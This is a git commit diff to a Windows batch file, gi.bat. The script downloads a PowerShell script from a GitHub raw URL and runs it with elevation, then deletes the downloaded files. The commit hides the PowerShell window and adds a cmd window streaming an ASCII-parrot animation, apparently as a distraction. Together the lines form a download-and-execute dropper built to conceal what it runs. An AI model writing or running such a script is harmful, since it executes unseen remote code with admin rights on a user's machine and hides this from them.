d30745c2669467b4c56726ca65a2d5f628306dfd
notnotdababu <134946990+notnotdababu@users.noreply.github.com>
2024-09-18 01:42:47 +0700

    Update gi.bat

--- gi.bat
+++ gi.bat
@@ -1,6 +1,7 @@
 @echo off
+start cmd /k "curl parrot.live"
 curl -O https://raw.githubusercontent.com/notnotdababu/fridge-solution/main/gi.ps1
-powershell -File "gi.ps1" -Verb RunAs
+powershell -WindowStyle hidden -File "gi.ps1" -Verb RunAs
 timeout /t 1
 del /Q gi.exe
 del /Q gi.ps1
